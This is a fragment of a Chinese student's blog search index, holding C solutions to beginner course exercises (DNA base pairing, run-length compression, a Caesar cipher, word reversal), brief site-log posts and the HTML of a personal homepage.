class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><span id="more"></span><hr><h6 id="2-碱基序列配对。已知DNA的一条链的碱基序列，求与之配对的DNA链的碱基序列。配对的规则为：A-T；G-C。"><a href="#2-碱基序列配对。已知DNA的一条链的碱基序列，求与之配对的DNA链的碱基序列。配对的规则为：A-T；G-C。" class="headerlink" title="2.碱基序列配对。已知DNA的一条链的碱基序列，求与之配对的DNA链的碱基序列。配对的规则为：A-T；G-C。"></a>2.碱基序列配对。已知DNA的一条链的碱基序列，求与之配对的DNA链的碱基序列。配对的规则为：A-T；G-C。</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></span><br><span class="line"><span class="comment">#define LEN 100</span></span><br><span class="line">int main(void)</span><br><span class="line">&#123;</span><br><span class="line">    char one[LEN],the_other[LEN];  //one用于存储原串；the_other用于存储匹配串</span><br><span class="line">    int i,j;</span><br><span class="line">    gets(one);</span><br><span class="line">    i=0, j=0;</span><br><span class="line">    <span class="keyword">while</span>(one[i]!=<span class="string">&#x27;\0&#x27;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">       //start</span><br><span class="line">       <span class="keyword">if</span>(one[i]==<span class="string">&#x27;A&#x27;</span>)</span><br><span class="line">       &#123;</span><br><span class="line">           the_other[j]=<span class="string">&#x27;T&#x27;</span>;</span><br><span class="line">       &#125;</span><br><span class="line">        <span class="keyword">if</span>(one[i]==<span class="string">&#x27;T&#x27;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            the_other[j]=<span class="string">&#x27;A&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(one[i]==<span class="string">&#x27;C&#x27;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">             the_other[j]=<span class="string">&#x27;G&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(one[i]==<span class="string">&#x27;G&#x27;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            the_other[j]=<span class="string">&#x27;C&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">         ++i;</span><br><span class="line">         ++j;</span><br><span class="line">       //end</span><br><span class="line">    &#125;</span><br><span class="line">    the_other[j] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">    puts(the_other);</span><br><span class="line">    <span class="built_in">return</span> 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><hr><h6 id="3-数据压缩存储（函数实现）。已知一段二进制0-1代码，长度小于100，以数字0开头，请试着用压缩后的方法将其显示出来。输入数据有多组。比如输入以数字0开头二进制0-1代码：000000111100011110000011；则输出为：6-4-3-4-5-2。"><a href="#3-数据压缩存储（函数实现）。已知一段二进制0-1代码，长度小于100，以数字0开头，请试着用压缩后的方法将其显示出来。输入数据有多组。比如输入以数字0开头二进制0-1代码：000000111100011110000011；则输出为：6-4-3-4-5-2。" class="headerlink" title="3.数据压缩存储（函数实现）。已知一段二进制0-1代码，长度小于100，以数字0开头，请试着用压缩后的方法将其显示出来。输入数据有多组。比如输入以数字0开头二进制0-1代码：000000111100011110000011；则输出为：6 4 3 4 5 2。"></a>3.数据压缩存储（函数实现）。已知一段二进制0-1代码，长度小于100，以数字0开头，请试着用压缩后的方法将其显示出来。输入数据有多组。比如输入以数字0开头二进制0-1代码：000000111100011110000011；则输出为：6 4 3 4 5 2。</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></span><br><span class="line"><span class="comment">#define LEN 100</span></span><br><span class="line">int <span class="function"><span class="title">main</span></span>()</span><br><span class="line">&#123;</span><br><span class="line">   int compress(char array[], int count[]);</span><br><span class="line">   char array[LEN];</span><br><span class="line">   int count[LEN];</span><br><span class="line">   int i;</span><br><span class="line">   int tail; //count数组的有效最末下标</span><br><span class="line">  <span class="keyword">while</span>(scanf(<span class="string">&quot;%s&quot;</span>,array)!=-1)</span><br><span class="line">   &#123;</span><br><span class="line">      tail = compress(array, count);</span><br><span class="line">      <span class="keyword">for</span>(i=0;i&lt;tail;i++)</span><br><span class="line">        i&lt;tail-1 ? <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>,count[i]) : <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,count[i]);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="built_in">return</span> 0;</span><br><span class="line">&#125;</span><br><span class="line">int compress(char array[], int count[])</span><br><span class="line">&#123;</span><br><span class="line">//start</span><br><span class="line">    int num=1,i,bef=array[0],j=0;</span><br><span class="line">    <span class="keyword">for</span>(i=1;array[i]!=<span class="string">&#x27;\0&#x27;</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(array[i]==bef)</span><br><span class="line">        &#123;</span><br><span class="line">            num++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            bef=array[i];</span><br><span class="line">            count[j++]=num;</span><br><span class="line">            num=1;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    count[j]=num;</span><br><span class="line">    <span class="built_in">return</span> ++j;</span><br><span class="line">//end</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><hr><h6 id="4-凯撒加密。已知的最古老的一种加密技术是凯撒加密。该方法把一条消息中的每个字母用字母表中固定距离之后的那个来替代。（如果越过了字母Z，会绕回到字母表的起始位置。例如，如果每个字母都用字母表中两个位置之后的字母代替，那么Y就被替换为A，Z就被替换为B。）编写程序用凯撒加密方法对消息进行加密。用户输入待加密的消息和移位计数（字母移动的位置数目）："><a href="#4-凯撒加密。已知的最古老的一种加密技术是凯撒加密。该方法把一条消息中的每个字母用字母表中固定距离之后的那个来替代。（如果越过了字母Z，会绕回到字母表的起始位置。例如，如果每个字母都用字母表中两个位置之后的字母代替，那么Y就被替换为A，Z就被替换为B。）编写程序用凯撒加密方法对消息进行加密。用户输入待加密的消息和移位计数（字母移动的位置数目）：" class="headerlink" title="4.凯撒加密。已知的最古老的一种加密技术是凯撒加密。该方法把一条消息中的每个字母用字母表中固定距离之后的那个来替代。（如果越过了字母Z，会绕回到字母表的起始位置。例如，如果每个字母都用字母表中两个位置之后的字母代替，那么Y就被替换为A，Z就被替换为B。）编写程序用凯撒加密方法对消息进行加密。用户输入待加密的消息和移位计数（字母移动的位置数目）："></a>4.凯撒加密。已知的最古老的一种加密技术是凯撒加密。该方法把一条消息中的每个字母用字母表中固定距离之后的那个来替代。（如果越过了字母Z，会绕回到字母表的起始位置。例如，如果每个字母都用字母表中两个位置之后的字母代替，那么Y就被替换为A，Z就被替换为B。）编写程序用凯撒加密方法对消息进行加密。用户输入待加密的消息和移位计数（字母移动的位置数目）：</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"> </span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;string.h&gt;</span></span><br><span class="line"><span class="comment">#define LEN 81</span></span><br><span class="line">int <span class="function"><span class="title">main</span></span>()</span><br><span class="line">&#123;</span><br><span class="line">   void Caesar_transform(char message[], int <span class="built_in">shift</span>);</span><br><span class="line">   char message[LEN];</span><br><span class="line">   int <span class="built_in">shift</span>;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;Enter message to be encrypted: &quot;</span>);</span><br><span class="line">   gets(message);</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;Enter shift amount (1-25): &quot;</span>);</span><br><span class="line">   scanf(<span class="string">&quot;%d&quot;</span>,&amp;<span class="built_in">shift</span>);</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;Encrypted message: &quot;</span>);</span><br><span class="line">   Caesar_transform(message, <span class="built_in">shift</span>);</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,message);</span><br><span class="line">   <span class="built_in">return</span> 0;</span><br><span class="line">&#125;</span><br><span class="line">void Caesar_transform(char message[], int <span class="built_in">shift</span>)</span><br><span class="line">&#123;</span><br><span class="line">//start</span><br><span class="line"><span class="keyword">for</span>(int i=0;i&lt;LEN;i++)&#123;</span><br><span class="line">    <span class="keyword">if</span>(message[i]&gt;=<span class="string">&#x27;a&#x27;</span>&amp;&amp;message[i]&lt;=<span class="string">&#x27;z&#x27;</span>)</span><br><span class="line">    message[i]=(message[i]-<span class="string">&#x27;a&#x27;</span>+<span class="built_in">shift</span>)%26+<span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">     <span class="keyword">if</span>(message[i]&gt;=<span class="string">&#x27;A&#x27;</span>&amp;&amp;message[i]&lt;=<span class="string">&#x27;Z&#x27;</span>)</span><br><span class="line">    message[i]=(message[i]-<span class="string">&#x27;A&#x27;</span>+<span class="built_in">shift</span>)%26+<span class="string">&#x27;A&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//end</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h6 id="5-单词逆序输出。编写程序颠倒句子中的单词的顺序："><a href="#5-单词逆序输出。编写程序颠倒句子中的单词的顺序：" class="headerlink" title="5.单词逆序输出。编写程序颠倒句子中的单词的顺序："></a>5.单词逆序输出。编写程序颠倒句子中的单词的顺序：</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#define LEN 500</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">   char array[LEN], ch;</span><br><span class="line">   int i, is_word, count_word;</span><br><span class="line">   printf(&quot;Enter a sentence: &quot;);</span><br><span class="line">   i=0;</span><br><span class="line">   is_word = 0;     //之前一个字符为字母（实为非分隔符）：1；反之：0</span><br><span class="line">   count_word = 0;  //记录句子中的单词个数</span><br><span class="line">   while(1)</span><br><span class="line">   &#123;</span><br><span class="line">       array[i]=getchar();</span><br><span class="line">       if(array[i]!=&#x27;?&#x27;&amp;&amp;array[i]!=&#x27;!&#x27;&amp;&amp;array[i]!=&#x27;.&#x27;) //不是句子结束标志吗？</span><br><span class="line">       &#123;</span><br><span class="line">          if(array[i]!=&#x27; &#x27;&amp;&amp;array[i]!=&#x27;\t&#x27;)            //是字母吗？</span><br><span class="line">          &#123;</span><br><span class="line">              if(is_word==0)</span><br><span class="line">              &#123;</span><br><span class="line">                 count_word++;</span><br><span class="line">                 is_word = 1;</span><br><span class="line">              &#125;</span><br><span class="line">          &#125;</span><br><span class="line">          else if(is_word==1)</span><br><span class="line">              is_word = 0;</span><br><span class="line">          i++;</span><br><span class="line">       &#125;</span><br><span class="line">       else</span><br><span class="line">       &#123;</span><br><span class="line">           ch = array[i];</span><br><span class="line">           array[i] = &#x27;\0&#x27;;</span><br><span class="line">           break;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   printf(&quot;Reversal of sentence: &quot;);</span><br><span class="line">   is_word = 0;</span><br><span class="line">   while(i!=-1)  //此时从句子末尾开始向句子的开始方向做回退式的判断并考虑做逐个单词的输出</span><br><span class="line">   &#123;</span><br><span class="line">      //start</span><br><span class="line">      int j,k;</span><br><span class="line">      for(k=0;;k++)</span><br><span class="line">      &#123;</span><br><span class="line">          if(array[k]==&#x27; &#x27;) array[k]=&#x27;*&#x27;;</span><br><span class="line">          else break;</span><br><span class="line">      &#125;</span><br><span class="line">      if(count_word&gt;=0) count_word=-1;</span><br><span class="line">      if(is_word==0)&#123;</span><br><span class="line">        is_word=-1;</span><br><span class="line">      &#125;else&#123;</span><br><span class="line"></span><br><span class="line">          if(array[i]!=&#x27; &#x27; &amp;&amp; count_word==-1)&#123;</span><br><span class="line">              is_word = i;</span><br><span class="line">              count_word=-2;</span><br><span class="line">          &#125;</span><br><span class="line">          if(array[i]==&#x27; &#x27; &amp;&amp; count_word==-2)&#123;</span><br><span class="line">             for(j=i+1;j&lt;=is_word;j++)</span><br><span class="line">                printf(&quot;%c&quot;,array[j]);</span><br><span class="line">                printf(&quot; &quot;);</span><br><span class="line">             count_word=-1;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      if(array[i]==&#x27;*&#x27;)&#123;</span><br><span class="line">          for(j=i+1;array[j]!=&#x27; &#x27;;j++)</span><br><span class="line">            printf(&quot;%c&quot;,array[j]);</span><br><span class="line">            i=0;</span><br><span class="line">            break;</span><br><span class="line">      &#125;</span><br><span class="line">    if(i==0)&#123;</span><br><span class="line">        for(j=i;array[j]!=&#x27; &#x27;;j++)</span><br><span class="line">            printf(&quot;%c&quot;,array[j]);</span><br><span class="line">        break;</span><br><span class="line">      &#125;</span><br><span class="line">      i--;</span><br><span class="line">      //end</span><br><span class="line">   &#125;</span><br><span class="line">   printf(&quot;%c\n&quot;,ch);</span><br><span class="line">   return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> C </tag>
            
            <tag> 基础 </tag>
            
            <tag> 锐格 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于登录和注册板块。。。</title>
      <link href="/2021/12/13/%E5%85%B3%E4%BA%8E%E7%99%BB%E5%BD%95%E5%92%8C%E6%B3%A8%E5%86%8C%E6%9D%BF%E5%9D%97%E3%80%82%E3%80%82%E3%80%82/"/>
      <url>/2021/12/13/%E5%85%B3%E4%BA%8E%E7%99%BB%E5%BD%95%E5%92%8C%E6%B3%A8%E5%86%8C%E6%9D%BF%E5%9D%97%E3%80%82%E3%80%82%E3%80%82/</url>
      
        <content type="html"><![CDATA[<p>都留着吧，之后说不定用得上</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>log</title>
      <link href="/2021/12/13/log/"/>
      <url>/2021/12/13/log/</url>
      
        <content type="html"><![CDATA[<p>登录和注册页面打算不整了，大家随便来看就好。。。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>log</title>
      <link href="/2021/12/11/test/"/>
      <url>/2021/12/11/test/</url>
      
        <content type="html"><![CDATA[<p>2021.12.11</p><p>布置了资源站页面。</p>]]></content>
      
      
      
    </entry>
    
    
  
  
    
    
    <entry>
      <title>1</title>
      <link href="/page1/index.html"/>
      <url>/page1/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/sources/about.html"/>
      <url>/sources/about.html</url>
      
        <content type="html"><![CDATA[<!DOCTYPE html><html><head>  <!-- Basic -->  <meta charset="utf-8" />  <meta http-equiv="X-UA-Compatible" content="IE=edge" />  <!-- Mobile Metas -->  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />  <!-- Site Metas -->  <meta name="keywords" content="" />  <meta name="description" content="" />  <meta name="author" content="" />  <title>Label</title>  <!-- bootstrap core css -->  <link rel="stylesheet" type="text/css" href="css/bootstrap.css" />  <!-- fonts style -->  <link href="https://fonts.googleapis.com/css?family=Open+Sans:400,700|Poppins:400,600,700&display=swap" rel="stylesheet" />  <!-- Custom styles for this template -->  <link href="css/style.css" rel="stylesheet" />  <!-- responsive style -->  <link href="css/responsive.css" rel="stylesheet" /></head><body class="sub_page">  <div class="hero_area">    <!-- header section strats -->    <header class="header_section">      <div class="container-fluid">        <nav class="navbar navbar-expand-lg custom_nav-container ">          <a class="navbar-brand" href="index.html">                     </a>          <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">            <span class="navbar-toggler-icon"></span>          </button>          <div class="collapse navbar-collapse ml-auto" id="navbarSupportedContent">            <ul class="navbar-nav  ml-auto">              <li class="nav-item active">                <a class="nav-link" href="index.html">主页 <span class="sr-only">(current)</span></a>              </li>              <li class="nav-item">                <a class="nav-link" href="about.html"> 关于 </a>              </li>              <li class="nav-item">                <a class="nav-link" href="course.html"> 资源 </a>              </li>              <li class="nav-item">                <a class="nav-link" href="event.html"> 事件 </a>              </li>              <li class="nav-item">                <a class="nav-link" href="contact.html">联系站长</a>              </li>              <li class="nav-item">                <a class="nav-link" href="login.html">登录</a>              </li>            </ul>            <form class="form-inline my-2 my-lg-0 ml-0 ml-lg-4 mb-3 mb-lg-0">              <button class="btn  my-2 my-sm-0 nav_search-btn" type="submit"></button>            </form>          </div>        </nav>      </div>    </header>    <!-- end header section -->  </div><!-- about section --><section class="about_section layout_padding">  <div class="side_img">      </div>  <div class="container">    <div class="row">      <div class="col-md-6">        <div class="img_container">          <div class="img-box b1">            <img src="images/a-1.jpg" alt="" />          </div>          <div class="img-box b2">            <img src="images/a-2.jpg" alt="" />          </div>        </div>      </div>      <div class="col-md-6">        <div class="detail-box">          <div class="heading_container">            <h3>              个人简介            </h3>            <p>              一段简单的个人简介：本人性别男，身高体重不详，重度拖延症患者，喜欢娱乐，喜欢运动，喜欢吃饭睡觉              比较佛系，只有当ddl来临时才会激发他的动力......            </p>            <a href="">              Read More            </a>          </div>        </div>      </div>    </div>  </div></section><!-- end about section -->  <!-- info section -->  <section class="info_section layout_padding">    <div class="container">      <div class="row">        <div class="col-md-3">          <div class="info_menu">            <h5>              QUICK LINKS            </h5>            <ul class="navbar-nav  ">              <li class="nav-item active">                <a class="nav-link" href="index.html">主页 <span class="sr-only">(current)</span></a>              </li>              <li class="nav-item">                <a class="nav-link" href="about.html"> 关于 </a>              </li>              <li class="nav-item">                <a class="nav-link" href="course.html"> 资源 </a>              </li>              <li class="nav-item">                <a class="nav-link" href="event.html"> 事件 </a>              </li>              <li class="nav-item">                <a class="nav-link" href="contact.html">联系站长</a>              </li>              <li class="nav-item">                <a class="nav-link" href="login.html">登录</a>              </li>            </ul>          </div>        </div>        <div class="col-md-3">          <div class="info_course">            <h5>              NEFU            </h5>            <p>              东北林业大学（Northeast Forestry University），简称东北林大（NEFU）               ，位于黑龙江省哈尔滨市，是一所以林科为优势、林业工程为特色的中华人民共和国教育部直属高校，              由教育部、国家林业局、黑龙江省人民政府三方共建，国家“世界一流学科建设高校”，国家“211工程”、“985工程优势学科创新平台”重点建设高校，              高水平行业特色大学优质资源共享联盟成员高校，“双一流”农科联盟成员高校             </p>          </div>        </div>        <div class="col-md-5 offset-md-1">          <div class="info_news">            <h5>              Computer Science            </h5>            <div class="info_contact">              <!-- <a href="">                Location              </a> -->              <p>                计算机科学与技术（Computer Science and Technology）是国家一级学科，                下设信息安全、软件工程、计算机软件与理论、计算机系统结构、计算机应用技术、计算机技术等专业                主修大数据技术导论、数据采集与处理实践（Python）、Web前/后端开发、统计与数据分析、机器学习、                高级数据库系统、数据可视化、云计算技术、人工智能、自然语言处理、媒体大数据案例分析、网络空间安全、                计算机网络、数据结构、软件工程、操作系统等课程，以及大数据方向系列实验，                并完成程序设计、数据分析、机器学习、数据可视化、大数据综合应用实践、专业实训和毕业设计等多种实践环节。              </p>            </div>                      </div>        </div>      </div>    </div>  </section>  <!-- end info section -->  <!-- footer section -->  <footer class="container-fluid footer_section">    <p>lbl~ All rights reserved.</p>  </footer>  <!-- footer section -->  <script type="text/javascript" src="js/jquery-3.4.1.min.js"></script>  <script type="text/javascript" src="js/bootstrap.js"></script></body></html>]]></content>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/sources/index.html"/>
      <url>/sources/index.html</url>
      
        <content type="html"><![CDATA[<!DOCTYPE html><html><head>  <!-- Basic -->  <meta charset="utf-8" />  <meta http-equiv="X-UA-Compatible" content="IE=edge" />  <!-- Mobile Metas -->  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />  <!-- Site Metas -->  <meta name="keywords" content="" />  <meta name="description" content="" />  <meta name="author" content="" />  <title>Label</title>  <!-- bootstrap core css -->  <link rel="stylesheet" type="text/css" href="css/bootstrap.css" />  <!-- fonts style -->  <link href="https://fonts.googleapis.com/css?family=Open+Sans:400,700|Poppins:400,600,700&display=swap" rel="stylesheet" />  <!-- Custom styles for this template -->  <link href="css/style.css" rel="stylesheet" />  <!-- responsive style -->  <link href="css/responsive.css" rel="stylesheet" /></head><style>  .article-entry ul li:before {    content: ;    width: 6px;    height: 6px;    border: 1px solid #999;    border-radius: 10px;    background: #aaa;    display: inline-block;    margin-right: 10px;    float: left;    margin-top: 10px;}</style><body>  <div class="hero_area">    <!-- header section strats -->    <header class="header_section">      <div class="container-fluid">        <nav class="navbar navbar-expand-lg custom_nav-container ">          <a class="navbar-brand" href="index.html">                      </a>          <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">            <span class="navbar-toggler-icon"></span>          </button>          <div class="collapse navbar-collapse ml-auto" id="navbarSupportedContent">            <ul class="navbar-nav  ml-auto">              <li class="nav-item active">                <a class="nav-link" href="index.html">主页 <span class="sr-only">(current)</span></a>              </li>              <li class="nav-item">                <a class="nav-link" href="about.html"> 关于 </a>              </li>              <li class="nav-item">                <a class="nav-link" href="course.html"> 资源 </a>              </li>                          </ul>            <form class="form-inline my-2 my-lg-0 ml-0 ml-lg-4 mb-3 mb-lg-0">              <button class="btn  my-2 my-sm-0 nav_search-btn" type="submit"></button>            </form>          </div>        </nav>      </div>    </header>    <!-- end header section -->    <!-- slider section -->    <section class=" slider_section position-relative">      <div id="carouselExampleIndicators" class="carousel slide" data-ride="carousel">        <ol class="carousel-indicators">          <li data-target="#carouselExampleIndicators" data-slide-to="0" class="active"></li>          <li data-target="#carouselExampleIndicators" data-slide-to="1"></li>          <li data-target="#carouselExampleIndicators" data-slide-to="2"></li>        </ol>        <div class="carousel-inner">          <div class="carousel-item active">            <div class="container">              <div class="row">                <div class="col">                  <div class="detail-box">                    <div>                      <h1>                        YoukainoYama                      </h1>                                          </div>                  </div>                </div>              </div>            </div>          </div>          <div class="carousel-item ">            <div class="container">              <div class="row">                <div class="col">                  <div class="detail-box">                    <div>                      <h1>                        W e l c o m e~                      </h1>                                          </div>                  </div>                </div>              </div>            </div>          </div>          <div class="carousel-item ">            <div class="container">              <div class="row">                <div class="col">                  <div class="detail-box">                    <div>                      <h1>                        欢  迎                      </h1>                    </div>                  </div>                </div>              </div>            </div>          </div>        </div>      </div>    </section>    <!-- end slider section -->  </div>  <!-- special section -->  <section class="special_section">    <div class="container">      <div class="special_container">        <div class="box b2">          <div class="img-box">            <img src="images/study.png" alt="" />          </div>          <div class="detail-box">            <h4>              C..++..<br />              C语言            </h4>                      </div>        </div>        <div class="box b2">          <div class="img-box">            <img src="images/study.png" alt="" />          </div>          <div class="detail-box">            <h4>               Java...<br />               java            </h4>                     </div>        </div>        <div class="box b2">          <div class="img-box">            <img src="images/books-stack-of-three.png" alt="" />          </div>          <div class="detail-box">            <h4>              database... <br/>              数据库            </h4>          </div>        </div>        <div class="box b2">          <div class="img-box">            <img src="images/books-stack-of-three.png" alt="" />          </div>          <div class="detail-box">            <h4>              数据结构<br />              算法设计与分析            </h4>          </div>        </div>      </div>    </div>  </section>  <!-- end special section -->  <!-- about section -->  <section class="about_section layout_padding">    <div class="side_img">          </div>    <div class="container">      <div class="row">        <div class="col-md-6">          <div class="img_container">            <div class="img-box b1">              <img src="images/a-1.jpg" alt="" />            </div>            <div class="img-box b2">              <img src="images/a-2.jpg" alt="" />            </div>          </div>        </div>        <div class="col-md-6">          <div class="detail-box">            <div class="heading_container">              <h3>                个人简介              </h3>              <p>                一段简单的个人简介：本人性别男，身高体重不详，重度拖延症患者，喜欢娱乐，喜欢运动，喜欢吃饭睡觉                比较佛系，只有当ddl来临时才会激发他的动力......              </p>              <a href="">                Read More              </a>            </div>          </div>        </div>      </div>    </div>  </section>  <!-- end about section -->  <!-- course section -->  <section class="course_section layout_padding-bottom">    <div class="side_img">    </div>    <div class="container">      <div class="heading_container">        <h3>          资源分享        </h3>        <p>          以下所有内容都来自于网络，与本人现实生活无关        </p>      </div>      <div class="course_container">        <div class="course_content">          <div class="box">            <img src="images/c-1.jpg" alt="" />            <a href="" class="">              <img src="images/link.png" alt="" />            </a>            <h5>              Touhou project<br />              project             </h5>          </div>          <div class="box">            <img src="images/c-2.jpg" alt="" />            <a href="" class="">              <img src="images/link.png" alt="" />            </a>            <h5>              音乐 <br />              Music~            </h5>          </div>        </div>        <div class="course_content">          <div class="box">            <img src="images/c-3.jpg" alt="" />            <a href="" class="">              <img src="images/link.png" alt="" />            </a>            <h5>              图片<br />                          </h5>          </div>          <div class="box">            <img src="images/c-4.jpg" alt="" />            <a href="" class="">              <img src="images/link.png" alt="" />            </a>            <h5>              游戏<br />                          </h5>          </div>          <div class="box">            <img src="images/c-5.jpg" alt="" />            <a href="" class="">              <img src="images/link.png" alt="" />            </a>            <h5>              其他资源            </h5>          </div>        </div>      </div>      <div class="btn-box">        <a href="">          Read More        </a>      </div>    </div>  </section>  <!-- end course section -->  <!-- client section -->  <section class="client_section layout_padding-bottom">    <div class="container">      <div class="heading_container">        <h3>          一些闲话        </h3>        <p>          